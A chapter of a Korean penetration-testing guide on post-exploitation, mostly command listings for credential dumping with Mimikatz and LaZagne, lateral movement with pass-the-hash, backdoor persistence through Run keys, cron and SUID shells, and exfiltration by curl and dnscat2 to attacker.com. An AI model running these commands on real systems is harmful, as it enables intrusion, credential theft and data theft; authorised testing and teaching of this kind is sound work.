후속 익스플로잇

초기 접근 획득 후 수행하는 후속 익스플로잇(Post-Exploitation) 활동을 다룹니다. 측면 이동, 지속성 확보, 데이터 수집 등 실제 공격자의 행동을 시뮬레이션합니다.

5.1 후속 익스플로잇 개요

후속 익스플로잇은 초기 시스템 접근 후 수행하는 모든 활동을 포함합니다. 이 단계에서는 침투한 네트워크 내에서 더 높은 권한을 획득하고, 다른 시스템으로 확산하며, 목표 데이터에 접근합니다.

5.1.1 후속 익스플로잇 목표

  • 권한 상승: 관리자 또는 시스템 수준의 권한 획득
  • 정보 수집: 내부 네트워크 구조, 계정, 자산 파악
  • 측면 이동: 다른 시스템으로의 접근 확장
  • 지속성 확보: 지속적인 접근을 위한 백도어 설치
  • 데이터 탈취: 목표 데이터 접근 및 추출
  • 흔적 제거: 활동 로그 정리 (실제 테스트에서는 권장하지 않음)

5.2 내부 정찰

5.2.1 Active Directory 정찰

# 도메인 정보
net user /domain
net group /domain
net group "Domain Admins" /domain
nltest /dclist:DOMAIN

# PowerView 사용
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser | select cn,samaccountname,description
Get-NetGroup | select cn
Get-NetComputer | select cn,operatingsystem

# BloodHound 데이터 수집
.\SharpHound.exe -c All
Invoke-BloodHound -CollectionMethod All

5.2.2 네트워크 탐색

# Windows 네트워크 탐색
net view
net view /domain
arp -a
route print
netstat -ano

# 내부 스캔 (Meterpreter)
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > run arp_scanner -r 10.0.0.0/24
meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=10.0.0.0/24

# Linux 네트워크 탐색
ip addr
ip route
ss -tulpn
cat /etc/hosts

5.3 자격 증명 수집

5.3.1 Windows 자격 증명

# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Meterpreter
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all

# 레지스트리에서 SAM 추출
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
secretsdump.py -sam sam.bak -system system.bak LOCAL

5.3.2 저장된 자격 증명

위치 설명 수집 방법
Windows 자격 증명 관리자 저장된 웹/네트워크 암호 cmdkey /list, Mimikatz
브라우저 저장소 Chrome, Firefox, Edge 암호 LaZagne, SharpWeb
SSH 키 개인 키 파일 ~/.ssh/ 검색
설정 파일 하드코딩된 암호 grep, findstr
히스토리 파일 명령어 기록 .bash_history, PSReadLine 
# LaZagne 전체 모듈 실행
python laZagne.py all

# 설정 파일에서 비밀번호 검색
findstr /si password *.xml *.ini *.txt *.config
grep -r "password" /var/www/ 2>/dev/null

# SSH 키 검색
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

5.4 측면 이동

5.4.1 Windows 측면 이동 기법

기법 포트 요구사항 도구
PsExec 445 (SMB) 관리자 권한 PsExec, Impacket
WMI 135, 445 관리자 권한 wmiexec, CrackMapExec
WinRM 5985, 5986 원격 관리 활성화 Evil-WinRM, PowerShell
RDP 3389 원격 데스크톱 활성화 rdesktop, xfreerdp
Pass-the-Hash 다양함 NTLM 해시 Mimikatz, Impacket 
# Impacket PsExec
psexec.py DOMAIN/user:password@192.168.1.100
psexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# WMI 실행
wmiexec.py DOMAIN/user:password@192.168.1.100

# Evil-WinRM
evil-winrm -i 192.168.1.100 -u user -p password
evil-winrm -i 192.168.1.100 -u user -H NTHASH

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u user -p password --shares
crackmapexec smb 192.168.1.100 -u user -H NTHASH -x "whoami"

5.4.2 Linux 측면 이동

# SSH 키를 이용한 이동
ssh -i id_rsa user@192.168.1.100

# SSH 터널링
ssh -L 8080:internal:80 user@jumphost
ssh -D 9050 user@jumphost

# ProxyChains 사용
proxychains nmap -sT 10.0.0.0/24
proxychains ssh user@internal

5.5 지속성 확보

⚠️ 참고

실제 침투 테스트에서 지속성 확보는 고객과 사전 합의된 범위 내에서만 수행해야 합니다. 모든 설치된 백도어는 테스트 완료 후 반드시 제거하고 문서화해야 합니다.

5.5.1 Windows 지속성

# 레지스트리 Run 키
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# 예약된 작업
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onstart /ru SYSTEM

# 서비스 생성
sc create backdoor binpath= "C:\backdoor.exe" start= auto

# WMI 이벤트 구독
# PowerShell 스크립트 필요

5.5.2 Linux 지속성

# Cron 작업
echo "* * * * * /path/to/backdoor" >> /var/spool/cron/crontabs/root

# SSH 키 추가
echo "attacker_public_key" >> ~/.ssh/authorized_keys

# .bashrc 수정
echo "/path/to/backdoor &" >> ~/.bashrc

# SUID 백도어
cp /bin/bash /tmp/.backdoor
chmod u+s /tmp/.backdoor

5.6 데이터 탈취

5.6.1 목표 데이터 식별

  • 데이터베이스: 고객 정보, 금융 데이터, 인증 정보
  • 파일 서버: 기밀 문서, 소스 코드, 설계도
  • 이메일: 내부 통신, 첨부 파일
  • 백업: 암호화되지 않은 백업 데이터
  • 클라우드 스토리지: S3, Azure Blob 등

5.6.2 데이터 추출 기법

# 파일 압축 및 전송
tar czvf data.tar.gz /sensitive/data/
scp data.tar.gz user@attacker:/tmp/

# Base64 인코딩
base64 -w0 file.pdf | curl -X POST -d @- http://attacker.com/receive

# DNS 터널링
dnscat2 --dns server=attacker.com

# HTTP/HTTPS 추출
curl -X POST -F "file=@sensitive.pdf" https://attacker.com/upload

# 클라우드 스토리지
aws s3 cp s3://target-bucket/ . --recursive
